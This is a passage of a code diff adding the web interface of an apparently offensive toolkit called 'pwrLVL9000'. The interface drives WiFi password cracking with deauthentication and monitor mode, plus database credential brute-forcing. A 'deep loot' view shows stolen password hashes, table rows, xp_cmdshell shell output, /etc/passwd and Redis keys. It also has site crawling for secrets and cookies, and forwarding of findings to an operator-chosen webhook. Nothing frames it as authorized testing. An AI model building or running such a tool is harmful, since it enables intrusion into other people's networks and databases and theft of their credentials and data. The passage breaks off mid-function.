+        <div id="list-db"></div>
+      </div>
+      <div class="tab-content" id="tc-loot">
+        <div class="no-data" id="nd-loot">[ NO LOOT EXTRACTED YET ]</div>
+        <div id="list-loot"></div>
+      </div>
+
+      <!-- Done banner -->
+      <div id="done-banner">
+        <div class="db-title">// SCAN COMPLETE</div>
+        <div class="db-stat">PAGES   : <span id="db-pages">0</span></div>
+        <div class="db-stat">COOKIES : <span id="db-cookies">0</span></div>
+        <div class="db-stat">SECRETS : <span id="db-secrets">0</span></div>
+        <div class="db-stat">AUTH HDR: <span id="db-headers">0</span></div>
+        <div class="db-actions">
+          <button class="ph-btn" onclick="exportJSON()">EXPORT JSON</button>
+          <button class="ph-btn" onclick="document.getElementById('done-banner').style.display='none'">CLOSE</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- .app -->
+
+<script>
+  /* ── Matrix rain ──────────────────────────────────────────────────────────── */
+  (function(){
+    const cv = document.getElementById('matrix-canvas');
+    const ctx = cv.getContext('2d');
+    function resize() {
+      cv.width  = window.innerWidth;
+      cv.height = window.innerHeight;
+    }
+    resize();
+    window.addEventListener('resize', resize);
+
+    const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
+    const fs    = 14;
+    let drops   = [];
+
+    function init() {
+      const cols = Math.floor(cv.width / fs);
+      drops = Array.from({length: cols}, () => Math.random() * -50);
+    }
+    init();
+    window.addEventListener('resize', init);
+
+    function draw() {
+      ctx.fillStyle = 'rgba(6,6,6,0.06)';
+      ctx.fillRect(0, 0, cv.width, cv.height);
+      ctx.fillStyle = '#00ff41';
+      ctx.font = `${fs}px monospace`;
+      for (let i = 0; i < drops.length; i++) {
+        const c = chars[Math.floor(Math.random() * chars.length)];
+        ctx.fillText(c, i * fs, drops[i] * fs);
+        if (drops[i] * fs > cv.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      }
+    }
+    setInterval(draw, 40);
+  })();
+
+  /* ── State ───────────────────────────────────────────────────────────────── */
+  let es          = null;
+  let scanStart   = null;
+  let jsonReport  = null;
+  let currentMode = 'web';
+  let cookieCount = 0, secretCount = 0, headerCount = 0, pageCount = 0;
+  let wifiCount   = 0, dbCount     = 0, lootCount   = 0, fileCount = 0;
+  let wifiAPs     = [];
+  let monitorIface = null;   // active monitor-mode interface name
+
+  /* ── Mode switching ─────────────────────────────────────────────────────── */
+  const ALL_MODES = ['web','wifi','db'];
+
+  function setMode(mode) {
+    ALL_MODES.forEach(m => {
+      document.getElementById(`mode-${m}`).classList.toggle('active', m === mode);
+      document.getElementById(`mode-${m}`).className =
+        `mode-btn${m === mode ? ' active ' + m : ' ' + m}`;
+      document.getElementById(`ctrl-${m}`).classList.toggle('active', m === mode);
+    });
+    currentMode = mode;
+    if (mode === 'wifi') loadWifiInterfaces();
+    if (mode === 'db')   loadDbTypes();
+  }
+
+  /* ── Tab switching ──────────────────────────────────────────────────────── */
+  function showTab(name) {
+    ['cookies','secrets','headers','files','wifi','db','loot'].forEach(n => {
+      document.getElementById(`tc-${n}`).classList.toggle('active', n === name);
+      document.getElementById(`tab-${n}-btn`).classList.toggle('active', n === name);
+    });
+  }
+
+  /* ── Terminal helpers ────────────────────────────────────────────────────── */
+  const terminal = document.getElementById('terminal');
+
+  function ts() {
+    if (!scanStart) return '00:00:00';
+    const d = Math.floor((Date.now() - scanStart) / 1000);
+    const h = String(Math.floor(d/3600)).padStart(2,'0');
+    const m = String(Math.floor((d%3600)/60)).padStart(2,'0');
+    const s = String(d%60).padStart(2,'0');
+    return `${h}:${m}:${s}`;
+  }
+
+  const LEVEL_LABEL = {
+    info:   'INFO ', ok: ' OK  ', warn: 'WARN ',
+    error:  ' ERR ', found: 'FIND ', secret: 'CRIT ',
+    cookie: 'COOK ', system: ' SYS ',
+  };
+
+  function addLine(msg, level='info') {
+    // Remove trailing cursor div first
+    const cursor = terminal.querySelector('.t-cursor');
+    const cursorParent = cursor ? cursor.parentElement : null;
+    if (cursorParent && cursorParent !== terminal) cursorParent.remove();
+    else if (cursor) cursor.remove();
+
+    const row = document.createElement('div');
+    row.className = `t-line ${level}`;
+    row.innerHTML = `<span class="t-ts">${ts()}</span>
+                     <span class="t-lvl">${LEVEL_LABEL[level]||level}</span>
+                     <span class="t-msg">${escHtml(msg)}</span>`;
+    terminal.appendChild(row);
+
+    // Re-add cursor
+    const cur = document.createElement('div');
+    cur.style.marginTop = '2px';
+    cur.innerHTML = '<span class="t-cursor"></span>';
+    terminal.appendChild(cur);
+
+    terminal.scrollTop = terminal.scrollHeight;
+  }
+
+  function clearTerminal() {
+    terminal.innerHTML = '<div style="margin-top:2px"><span class="t-cursor"></span></div>';
+  }
+
+  function escHtml(s) {
+    return String(s)
+      .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+      .replace(/"/g,'&quot;');
+  }
+
+  /* ── Stats ───────────────────────────────────────────────────────────────── */
+  function setStat(id, val, cls='') {
+    const el = document.getElementById(`sv-${id}`);
+    el.textContent = val;
+    const box = document.getElementById(`sb-${id}`);
+    box.className = 'stat-box' + (cls ? ' '+cls : '');
+  }
+
+  /* ── Badges ──────────────────────────────────────────────────────────────── */
+  function setBadge(id, n, cls='') {
+    const el = document.getElementById(`badge-${id}`);
+    el.textContent = n;
+    el.className = 'tab-badge' + (cls ? ' '+cls : '');
+  }
+
+  /* ── Progress bar ────────────────────────────────────────────────────────── */
+  const progressBar = document.getElementById('progress-bar');
+
+  function setProgress(done, total) {
+    const pct = total > 0 ? Math.min(100, Math.round(done/total*100)) : 0;
+    progressBar.classList.remove('indeterminate');
+    progressBar.style.width = pct + '%';
+  }
+
+  /* ── Findings ────────────────────────────────────────────────────────────── */
+  function addCookieCard(d) {
+    document.getElementById('nd-cookies').style.display = 'none';
+    const el = document.createElement('div');
+    el.className = `card ${d.severity}`;
+
+    const ss  = d.same_site || 'unset';
+    const ssClass = ['strict','lax'].includes(ss.toLowerCase()) ? 'ok' : 'warn';
+
+    el.innerHTML = `
+      <div class="card-header">
+        <span class="card-title" style="color:var(--cyan)">${escHtml(d.name)}</span>
+        <span class="sev-badge ${d.severity}">${d.severity}</span>
+      </div>
+      <div class="card-meta">URL: ${escHtml(d.url)}</div>
+      <div class="card-snippet" style="margin-top:4px;margin-bottom:4px">${escHtml(d.value)}</div>
+      <div class="card-flags">
+        <span class="flag ${d.secure    ? 'ok':'bad'}">${d.secure    ? '✓':'✗'} SECURE</span>
+        <span class="flag ${d.http_only ? 'ok':'bad'}">${d.http_only ? '✓':'✗'} HTTPONLY</span>
+        <span class="flag ${ssClass}">SAMESITE=${escHtml(ss.toUpperCase())}</span>
+        ${d.domain ? `<span class="flag warn">DOMAIN=${escHtml(d.domain)}</span>` : ''}
+      </div>
+      ${d.issues.map(i=>`<div class="card-issue">${escHtml(i)}</div>`).join('')}
+    `;
+    document.getElementById('list-cookies').appendChild(el);
+  }
+
+  function addSecretCard(d) {
+    document.getElementById('nd-secrets').style.display = 'none';
+    const el = document.createElement('div');
+    el.className = 'card CRIT';
+    const ent = d.entropy ? `  entropy=${d.entropy}` : '';
+    const src = d.source.startsWith('js:') ? d.source.slice(3) : d.source;
+
+    el.innerHTML = `
+      <div class="card-header">
+        <span class="card-pattern">[${escHtml(d.pattern)}]</span>
+        <span class="sev-badge CRIT">CRITICAL</span>
+      </div>
+      <div class="card-meta">SOURCE: ${escHtml(src)}</div>
+      <div class="card-meta">URL: ${escHtml(d.url)}</div>
+      <div class="card-meta">LINE: ${d.line_num}${ent}</div>
+      <div class="card-snippet">${escHtml(d.snippet)}</div>
+    `;
+    document.getElementById('list-secrets').appendChild(el);
+  }
+
+  function addHeaderCard(d) {
+    document.getElementById('nd-headers').style.display = 'none';
+    const el = document.createElement('div');
+    el.className = 'card HIGH';
+    el.innerHTML = `
+      <div class="card-header">
+        <span class="card-title" style="color:var(--red)">${escHtml(d.header)}</span>
+        <span class="sev-badge HIGH">HIGH</span>
+      </div>
+      <div class="card-meta">URL: ${escHtml(d.url)}</div>
+      <div class="card-snippet">${escHtml(d.value)}</div>
+    `;
+    document.getElementById('list-headers').appendChild(el);
+  }
+
+  /* ── Exposed file card ──────────────────────────────────────────────────── */
+  function addFileCard(d) {
+    document.getElementById('nd-files').style.display = 'none';
+    const sev     = d.severity || 'LOW';
+    const sevColor = {CRITICAL:'var(--red)', HIGH:'var(--orange)', MEDIUM:'var(--yellow)', LOW:'var(--cyan)'}[sev] || 'var(--cyan)';
+    const secrets = d.secrets_found || [];
+    const preview = d.preview || '';
+    const el = document.createElement('div');
+    el.className = `card ${sev === 'CRITICAL' || sev === 'HIGH' ? 'HIGH' : 'MEDIUM'}`;
+    el.style.cssText = `border-color:${sevColor};`;
+    el.innerHTML = `
+      <div class="card-header">
+        <span class="card-title" style="color:${sevColor}">📂 ${escHtml(d.path)}</span>
+        <span class="sev-badge" style="border-color:${sevColor};color:${sevColor}">${sev}</span>
+      </div>
+      <div class="card-meta">
+        <span style="margin-right:12px">URL: <a href="${escHtml(d.url)}" target="_blank" style="color:${sevColor}">${escHtml(d.url)}</a></span>
+        <span style="margin-right:12px">SIZE: ${(d.size||0).toLocaleString()} bytes</span>
+        <span>TYPE: ${escHtml((d.content_type||'').split(';')[0])}</span>
+      </div>
+      ${secrets.length ? `<div class="card-meta" style="color:var(--red);margin-top:4px">🔑 SECRETS: ${escHtml(secrets.join(', '))}</div>` : ''}
+      ${preview ? `<div class="card-snippet" style="border-color:${sevColor};opacity:.85;max-height:120px;overflow:hidden">${escHtml(preview.substring(0,500))}</div>` : ''}
+    `;
+    document.getElementById('list-files').appendChild(el);
+  }
+
+  function clearFindings() {
+    ['cookies','secrets','headers','files','wifi','db','loot'].forEach(n => {
+      document.getElementById(`list-${n}`).innerHTML = '';
+      document.getElementById(`nd-${n}`).style.display = '';
+    });
+    cookieCount = secretCount = headerCount = fileCount = wifiCount = dbCount = lootCount = 0;
+    ['cookies','secrets','headers','files','wifi','db'].forEach(n => setBadge(n,0));
+  }
+
+  /* ── WiFi finding card ──────────────────────────────────────────────────── */
+  function addWifiCard(d) {
+    document.getElementById('nd-wifi').style.display = 'none';
+    const el = document.createElement('div');
+    el.className = 'card WIFI';
+    el.innerHTML = `
+      <div class="card-header">
+        <span class="card-title" style="color:var(--cyan)">📡 ${escHtml(d.essid)}</span>
+        <span class="sev-badge" style="border-color:var(--cyan);color:var(--cyan)">CRACKED</span>
+      </div>
+      <div class="card-meta">BSSID: ${escHtml(d.bssid)}</div>
+      <div class="card-meta">METHOD: ${escHtml(d.method)}</div>
+      <div class="card-pw">🔑 PASSWORD: ${escHtml(d.password)}</div>
+    `;
+    document.getElementById('list-wifi').appendChild(el);
+  }
+
+  /* ── DB hit card ────────────────────────────────────────────────────────── */
+  function addDbCard(d) {
+    document.getElementById('nd-db').style.display = 'none';
+    const el = document.createElement('div');
+    el.className = 'card DBHIT';
+    el.innerHTML = `
+      <div class="card-header">
+        <span class="card-title" style="color:var(--orange)">🗄 ${escHtml(d.db_type.toUpperCase())}</span>
+        <span class="sev-badge" style="border-color:var(--orange);color:var(--orange)">ACCESS</span>
+      </div>
+      <div class="card-meta">HOST: ${escHtml(d.host)}:${escHtml(String(d.port))}</div>
+      <div class="card-snippet">
+USER: ${escHtml(d.username)}
+PASS: ${escHtml(d.password)}</div>
+    `;
+    document.getElementById('list-db').appendChild(el);
+  }
+
+  /* ── DB loot card ───────────────────────────────────────────────────────── */
+  function addDbLootCard(d) {
+    document.getElementById('nd-loot').style.display = 'none';
+    const el = document.createElement('div');
+    el.className = 'card DBHIT';
+    el.style.cssText = 'border-color:var(--red);box-shadow:0 0 12px rgba(255,0,51,.25)';
+
+    let body = '';
+
+    // Server info
+    let infoLines = [`HOST    : ${escHtml(String(d.host))}:${escHtml(String(d.port))}`,
+                     `USER    : ${escHtml(String(d.user||'?'))}`];
+    if (d.version)      infoLines.push(`VERSION : ${escHtml(String(d.version).substring(0,80))}`);
+    if (d.servername)   infoLines.push(`SERVER  : ${escHtml(d.servername)}`);
+    if (d.system_user)  infoLines.push(`SYS USER: ${escHtml(d.system_user)}`);
+    if (d.is_sysadmin)  infoLines.push(`ROLE    : *** SYSADMIN ***`);
+    if (d.current_user) infoLines.push(`CUR USER: ${escHtml(d.current_user)}`);
+    if (d.databases) {
+      const dbs = d.databases.map(x => typeof x === 'object' ? x.name : x);
+      infoLines.push(`DBS     : ${escHtml(dbs.slice(0,15).join(', '))}`);
+    }
+    body += `<div class="card-snippet">${infoLines.join('\n')}</div>`;
+
+    // Password hashes
+    const hashes = d.password_hashes || d.users || [];
+    if (hashes.length) {
+      const hashLines = hashes.map(h => {
+        const u  = h.user || '?';
+        const hv = h.hash || '';
+        const su = h.superuser ? ' [SUPER]' : '';
+        return `${escHtml(u)}${su}: ${escHtml(hv)}`;
+      });
+      body += `<div class="card-meta" style="color:var(--red);margin-top:8px">🔐 PASSWORD HASHES (${hashes.length})</div>`;
+      body += `<div class="card-snippet" style="border-color:rgba(255,0,51,.4)">${hashLines.join('\n')}</div>`;
+    }
+
+    // Sample data
+    const sampleData = d.sample_data || {};
+    Object.entries(sampleData).slice(0,4).forEach(([tname, tdata]) => {
+      body += `<div class="card-meta" style="color:var(--orange);margin-top:8px">📋 ${escHtml(tname)}</div>`;
+      if (Array.isArray(tdata)) {
+        // MongoDB docs
+        try { body += `<div class="card-snippet" style="border-color:rgba(255,106,0,.4)">${escHtml(JSON.stringify(tdata, null, 2).substring(0,800))}</div>`; }
+        catch(_) {}
+      } else {
+        const cols = (tdata.columns||[]).join(' | ');
+        const rows = (tdata.rows||[]).map(r => r.map(v => String(v).substring(0,30)).join(' | ')).join('\n');
+        body += `<div class="card-snippet" style="border-color:rgba(255,106,0,.4)">${escHtml(cols)}\n${escHtml('─'.repeat(Math.min(80, cols.length)))}\n${escHtml(rows)}</div>`;
+      }
+    });
+
+    // cmdshell output
+    if (d.cmdshell && d.cmdshell.length) {
+      body += `<div class="card-meta" style="color:var(--red);margin-top:8px">💻 OS SHELL (xp_cmdshell)</div>`;
+      body += `<div class="card-snippet" style="border-color:rgba(255,0,51,.4)">${escHtml(d.cmdshell.join('\n'))}</div>`;
+    }
+
+    // /etc/passwd
+    if (d.etc_passwd) {
+      body += `<div class="card-meta" style="color:var(--red);margin-top:8px">📄 /etc/passwd</div>`;
+      body += `<div class="card-snippet" style="border-color:rgba(255,0,51,.4)">${escHtml(d.etc_passwd.substring(0,1200))}</div>`;
+    }
+
+    // Redis keys
+    if (d.keys && Object.keys(d.keys).length) {
+      const keys = d.keys;
+      const keyLines = Object.entries(keys).slice(0,50).map(([k,v]) => `${k}: ${String(v).substring(0,80)}`);
+      body += `<div class="card-meta" style="color:var(--orange);margin-top:8px">🔑 REDIS KEYS (${Object.keys(keys).length} total)</div>`;
+      body += `<div class="card-snippet" style="border-color:rgba(255,106,0,.4)">${escHtml(keyLines.join('\n'))}</div>`;
+    }
+
+    if (d.error) {
+      body += `<div class="card-meta" style="color:var(--red);margin-top:8px">⚠ Extraction error: ${escHtml(d.error)}</div>`;
+    }
+
+    el.innerHTML = `
+      <div class="card-header">
+        <span class="card-title" style="color:var(--red)">💀 DEEP LOOT: ${escHtml((d.type||'DB').toUpperCase())} @ ${escHtml(String(d.host))}</span>
+        <span class="sev-badge" style="border-color:var(--red);color:var(--red)">EXTRACTED</span>
+      </div>
+      ${body}
+    `;
+    document.getElementById('list-loot').appendChild(el);
+  }
+
+  /* ── WiFi UI helpers ────────────────────────────────────────────────────── */
+  function loadWifiInterfaces() {
+    fetch('/wifi/interfaces').then(r=>r.json()).then(ifaces => {
+      const sel = document.getElementById('wifi-iface');
+      if (!ifaces.length) {
+        sel.innerHTML = '<option value="">no wireless adapters found</option>';
+        addLine('No wireless adapters found. Plug in a WiFi dongle and click ↻', 'warn');
+        return;
+      }
+      sel.innerHTML = ifaces.map(i => {
+        const modeColor = i.mode === 'monitor' ? '🔴' : '🟢';
+        const label = `${i.iface} [${i.mode}]${i.essid ? '  ' + i.essid : ''}`;
+        return `<option value="${escHtml(i.iface)}">${modeColor} ${escHtml(label)}</option>`;
+      }).join('');
+      // Re-select monitor iface if still in list
+      if (monitorIface) {
+        for (const opt of sel.options) {
+          if (opt.value === monitorIface) { sel.value = monitorIface; break; }
+        }
+      }
+    }).catch(()=>{ addLine('Could not load interfaces.', 'error'); });
+  }
+
+  /* ── Monitor mode toggle ──────────────────────────────────────────────────── */
+  function monitorOn() {
+    const iface = document.getElementById('wifi-iface').value;
+    if (!iface) { addLine('Select a wireless adapter first.', 'error'); return; }
+
+    const btn = document.getElementById('btn-mon-on');
+    btn.disabled = true;
+    btn.textContent = '… ENABLING';
+    addLine(`Enabling monitor mode on ${iface} (killing interfering processes)...`, 'info');
+
+    fetch('/wifi/monitor/on', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({iface}),
+    })
+    .then(r => r.json())
+    .then(d => {
+      (d.logs || []).forEach(l => addLine(l, 'info'));
+      if (d.ok) {
+        monitorIface = d.mon_iface;
+        addLine(`✔ Monitor mode ACTIVE → ${monitorIface}`, 'ok');
+        document.getElementById('monitor-status').textContent = `MON: ${monitorIface}`;
+        btn.style.display = 'none';
+        btn.textContent = '▶ MON ON';
+        btn.disabled = false;
+        document.getElementById('btn-mon-off').style.display = '';
+        loadWifiInterfaces();
+      } else {
+        addLine(`✘ Monitor mode FAILED: ${d.error || 'unknown error'}`, 'error');
+        addLine('Make sure you are running as root and have a compatible adapter.', 'warn');
+        btn.textContent = '▶ MON ON';
+        btn.disabled = false;
+      }
+    })
+    .catch(e => {
+      addLine(`Error: ${e}`, 'error');
+      btn.textContent = '▶ MON ON';
+      btn.disabled = false;
+    });
+  }
+
+  function monitorOff() {
+    const iface = monitorIface || document.getElementById('wifi-iface').value;
+    if (!iface) return;
+
+    const btn = document.getElementById('btn-mon-off');
+    btn.disabled = true;
+    btn.textContent = '… STOPPING';
+    addLine(`Stopping monitor mode on ${iface}...`, 'info');
+
+    fetch('/wifi/monitor/off', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({iface}),
+    })
+    .then(r => r.json())
+    .then(d => {
+      (d.logs || []).forEach(l => addLine(l, 'info'));
+      addLine('Monitor mode disabled. Interface restored to managed.', 'ok');
+      monitorIface = null;
+      document.getElementById('monitor-status').textContent = '';
+      btn.style.display = 'none';
+      btn.textContent = '■ MON OFF';
+      btn.disabled = false;
+      document.getElementById('btn-mon-on').style.display = '';
+      loadWifiInterfaces();
+    })
+    .catch(e => {
+      addLine(`Error: ${e}`, 'error');
+      btn.textContent = '■ MON OFF';
+      btn.disabled = false;
+    });
+  }
+
+  function wifiScanAPs() {
+    const iface = monitorIface || document.getElementById('wifi-iface').value;
+    if (!iface) { addLine('Select a wireless adapter first.', 'error'); return; }
+    if (!monitorIface) {
+      addLine('⚠ Interface not in monitor mode — click MON ON first for reliable AP scanning.', 'warn');
+    }
+    clearTerminal();
+    progressBar.classList.add('indeterminate');
+    scanStart = Date.now();
+    addLine(`Scanning for APs on ${iface}...`, 'info');
+
+    const params = new URLSearchParams({
+      iface,
+      duration: 15,
+      webhook_url: document.getElementById('webhook-url').value.trim(),
+    });
+
+    if (es) { es.close(); }
+    es = new EventSource(`/wifi/scan_aps?${params}`);
+    es.onmessage = e => {
+      try {
+        const ev = JSON.parse(e.data);
+        if (ev.type === 'ap_list') {
+          wifiAPs = ev.aps;
+          const sel = document.getElementById('wifi-ap-select');
+          sel.innerHTML = ev.aps.length
+            ? ev.aps.map(a=>`<option value="${escHtml(a.bssid)}" data-ch="${escHtml(a.channel)}" data-essid="${escHtml(a.essid)}">${escHtml(a.essid)} — ${escHtml(a.bssid)} [CH${escHtml(a.channel)}] ${escHtml(a.privacy)} PWR:${escHtml(a.power)}</option>`).join('')
+            : '<option value="">no APs found</option>';
+          addLine(`Found ${ev.aps.length} APs. Select target and click CRACK.`, 'ok');
+        } else {
+          handleEvent(ev);
+        }
+      } catch(_) {}
+    };
+    es.onerror = () => { endScan(); };
+  }
+
+  function wifiCrack() {
+    const iface  = monitorIface || document.getElementById('wifi-iface').value;
+    const apSel  = document.getElementById('wifi-ap-select');
+    const bssid  = apSel.value;
+    if (!iface || !bssid) { addLine('Select adapter and target AP.', 'error'); return; }
+    if (!monitorIface) {
+      addLine('⚠ Adapter may not be in monitor mode. Run MON ON first.', 'warn');
+    }
+    const opt    = apSel.options[apSel.selectedIndex];
+    const channel = opt.getAttribute('data-ch') || '1';
+    const essid   = opt.getAttribute('data-essid') || bssid;
+
+    clearTerminal();
+    wifiCount = 0; setBadge('wifi', 0);
+    progressBar.classList.add('indeterminate');
+    scanStart = Date.now();
+    document.getElementById('app').classList.add('scanning');
+
+    const wh = document.getElementById('webhook-url').value.trim();
+    if (wh) addLine(`Webhook active → ${wh}`, 'found');
+
+    const params = new URLSearchParams({
+      iface, bssid, channel, essid,
+      wordlist:    document.getElementById('wifi-wordlist').value.trim(),
+      deauth:      document.getElementById('wifi-deauth').value,
+      cap_timeout: 90,
+      method:      document.getElementById('wifi-method').value,
+      webhook_url: wh,
+    });
+
+    if (es) es.close();
+    es = new EventSource(`/wifi/crack?${params}`);
+    es.onmessage = e => { try { handleEvent(JSON.parse(e.data)); } catch(_) {} };
+    es.onerror   = () => { addLine('Connection closed.', 'warn'); endScan(); };
+  }
+
+  /* ── DB helpers ─────────────────────────────────────────────────────────── */
+  function loadDbTypes() {
+    fetch('/db/types').then(r=>r.json()).then(types => {
+      const row = document.getElementById('db-types-row');
+      row.innerHTML = types.map(t =>
+        `<label class="db-type-chk">
+          <input type="checkbox" class="db-type-cb" value="${t}" checked>
+          ${t.toUpperCase()}
+        </label>`
+      ).join('');
+    }).catch(()=>{});
+  }
+
+  function dbScan() {
+    const target = document.getElementById('db-target').value.trim();
+    if (!target) { addLine('Enter a target host/IP.', 'error'); return; }
+
+    const types = [...document.querySelectorAll('.db-type-cb:checked')].map(c=>c.value).join(',');
+    clearTerminal();
+    dbCount = 0; setBadge('db', 0);
+    progressBar.classList.add('indeterminate');
+    scanStart = Date.now();
+    document.getElementById('app').classList.add('scanning');
+
+    const wh = document.getElementById('webhook-url').value.trim();
+    if (wh) addLine(`Webhook active → ${wh}`, 'found');
+    addLine(`DB Scan target: ${target}`, 'info');
+
+    const params = new URLSearchParams({
+      target,
+      db_types:      types,
+      threads:       document.getElementById('db-threads').value,
+      wordlist_file: document.getElementById('db-wordlist').value.trim(),
+      webhook_url:   wh,
+    });
+
+    if (es) es.close();
+    es = new EventSource(`/db/scan?${params}`);
+    es.onmessage = e => { try { handleEvent(JSON.parse(e.data)); } catch(_) {} };
+    es.onerror   = () => { addLine('Connection closed.', 'warn'); endScan(); };
+  }
+
+  /* ── SSE event handler ────────────────────────────────────────────────────── */
+  function handleEvent(ev) {
+    switch(ev.type) {
+      case 'log':
+        addLine(ev.message, ev.level || 'info');
+        break;
+
+      case 'scan_start':
+        addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'system');
+        addLine(`SCAN INITIATED → ${ev.url}`, 'system');
+        addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'system');
+        progressBar.classList.add('indeterminate');
+        break;
+
+      case 'cookie':
+        cookieCount++;
+        addCookieCard(ev.data);
+        setStat('cookies', cookieCount, ev.data.severity==='HIGH'?'alert':(ev.data.severity==='MEDIUM'?'warn':''));
+        setBadge('cookies', cookieCount, ev.data.severity==='HIGH'?'red':(ev.data.severity==='MEDIUM'?'yellow':''));
+        break;
+
+      case 'secret':
+        secretCount++;
+        addSecretCard(ev.data);
+        setStat('secrets', secretCount, 'alert');
+        setBadge('secrets', secretCount, 'red');
+        // Auto-switch to secrets tab on first hit
+        if (secretCount === 1) showTab('secrets');
+        break;
+
+      case 'auth_header':
+        headerCount++;
+        addHeaderCard(ev.data);
+        setStat('headers', headerCount, 'warn');
+        setBadge('headers', headerCount, 'yellow');
+        break;
+
+      case 'exposed_file': {
+        fileCount++;
+        addFileCard(ev.data);
+        const fc = fileCount;
+        const fsev = ev.data.severity || 'LOW';
+        setBadge('files', fc, fsev === 'CRITICAL' || fsev === 'HIGH' ? 'red' : 'yellow');
+        if (fc === 1 || fsev === 'CRITICAL') showTab('files');
+        break;
+      }
+
+      case 'progress':
+        pageCount = ev.pages_done;
+        setStat('pages', pageCount);
+        setStat('cookies', ev.cookies,  ev.cookies  > 0 ? '' : '');
+        setStat('secrets', ev.secrets,  ev.secrets  > 0 ? 'alert' : '');
+        setStat('headers', ev.auth_headers, ev.auth_headers > 0 ? 'warn' : '');
+        setProgress(ev.pages_done, ev.pages_done + (ev.pages_queued||0));
+        break;
+
+      case 'done':
+        scanDone(ev.summary || {});
+        break;
+
+      case 'error':
+        addLine(`ERROR: ${ev.message}`, 'error');
+        break;
+
+      case 'wifi_cracked':
+        wifiCount++;
+        addWifiCard(ev.data);
+        setBadge('wifi', wifiCount, 'red');
+        showTab('wifi');
+        break;
+
+      case 'wifi_failed':
+        addLine(`Not cracked: ${ev.data.essid} (${ev.data.bssid})`, 'warn');
+        endScan();
+        break;
+
+      case 'ap_list':
+        addLine(`AP scan returned ${ev.aps.length} network(s).`, 'ok');
+        endScan();
+        break;
+
+      case 'db_scan_start':
+        addLine(`DB scan started → ${ev.target}`, 'system');
+        break;
+
+      case 'db_hit':
+        dbCount++;
+        addDbCard(ev.data);
+        setBadge('db', dbCount, 'red');
+        showTab('db');
+        break;
+
+      case 'db_loot':
+        lootCount++;
+        addDbLootCard(ev.data);
+        setBadge('loot', lootCount, 'red');
+        showTab('loot');
+        addLine(`💀 LOOT EXTRACTED from ${ev.data.host} [${ev.data.type}]`, 'secret');
+        break;
+
+      case 'db_done':
+        addLine(`DB scan complete. ${dbCount} credential(s) cracked. ${lootCount} full loot bag(s).`,
+                dbCount > 0 ? 'secret' : 'ok');
+        endScan();
+        break;
+    }
+  }
+
+  /* ── Scan start ──────────────────────────────────────────────────────────── */
+  function startScan() {
+    const url = document.getElementById('target-url').value.trim();
+    if (!url) {
+      document.getElementById('target-url').focus();
+      return;
+    }
+    if (es) { es.close(); es = null; }
+
+    // Reset
+    clearTerminal();
+    clearFindings();
+    setStat('pages',0); setStat('cookies',0); setStat('secrets',0); setStat('headers',0);
+    cookieCount=0; secretCount=0; headerCount=0; pageCount=0;
+    jsonReport = null;
+    document.getElementById('done-banner').style.display = 'none';
+    document.getElementById('btn-export').disabled = true;
+    document.getElementById('app').classList.add('scanning');
+    progressBar.classList.add('indeterminate');
+    progressBar.style.width = '';
+    scanStart = Date.now();
+
+    const params = new URLSearchParams({
+      url,
+      max_pages:    document.getElementById('max-pages').value,
+      timeout:      document.getElementById('timeout').value,
+      entropy:      document.getElementById('entropy').value,
+      verify_ssl:   document.getElementById('verify-ssl').checked,
+      probe_files:  document.getElementById('probe-files').checked,
+      file_threads: document.getElementById('file-threads').value,
+      webhook_url:  document.getElementById('webhook-url').value.trim(),
+    });
+
+    const wh = document.getElementById('webhook-url').value.trim();
+    if (wh) {
+      addLine(`Webhook active → ${wh}`, 'found');
+    }
+
+    es = new EventSource(`/scan?${params}`);
+    es.onmessage = e => {
+      try { handleEvent(JSON.parse(e.data)); } catch(_) {}
+    };
+    es.onerror = () => {
+      addLine('Connection lost or scan complete.', 'warn');
+      endScan();
+    };
+  }
+
+  /* ── Stop ─────────────────────────────────────────────────────────────────── */
+  function stopScan() {
+    fetch('/stop', {method:'POST'}).catch(()=>{});
+    if (es) { es.close(); es = null; }
+    addLine('Scan aborted by operator.', 'warn');
+    endScan();
+  }
+
+  /* ── Scan done ───────────────────────────────────────────────────────────── */
+  function scanDone(summary) {
+    if (summary.json_report) jsonReport = summary.json_report;
+    document.getElementById('btn-export').disabled = false;
+
+    const banner = document.getElementById('done-banner');
+    document.getElementById('db-pages').textContent   = summary.pages    || pageCount;
+    document.getElementById('db-cookies').textContent = summary.cookies  || cookieCount;
+    document.getElementById('db-secrets').textContent = summary.secrets  || secretCount;
+    document.getElementById('db-headers').textContent = summary.auth_headers || headerCount;
+    banner.style.display = 'block';
+
+    addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'system');
+    addLine(`SCAN COMPLETE — ${summary.pages||pageCount} pages | ${summary.cookies||cookieCount} cookies | ${summary.secrets||secretCount} secrets`, 'system');
+    addLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'system');
+
+    endScan();
+  }
+
+  function endScan() {
+    if (es) { es.close(); es = null; }
+    document.getElementById('app').classList.remove('scanning');
+    progressBar.classList.remove('indeterminate');
+    progressBar.style.width = '100%';
+    setTimeout(()=>{ progressBar.style.width='0%'; }, 1800);
+  }
+
+  /* ── Export ──────────────────────────────────────────────────────────────── */
+  function exportJSON() {
+    if (!jsonReport) return;
+    const blob = new Blob([jsonReport], {type:'application/json'});
+    const a    = document.createElement('a');
+    a.href     = URL.createObjectURL(blob);
+    const ts2  = new Date().toISOString().replace(/[:.]/g,'-').slice(0,19);
+    a.download = `pwrLVL9000-${ts2}.json`;
+    a.click();
+    URL.revokeObjectURL(a.href);
+  }
+
+  /* ── Keyboard shortcut ────────────────────────────────────────────────────── */
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape') stopScan();
+  });
+
+  /* ── Test webhook ─────────────────────────────────────────────────────────── */
+  function testWebhook() {
+    const wh = document.getElementById('webhook-url').value.trim();
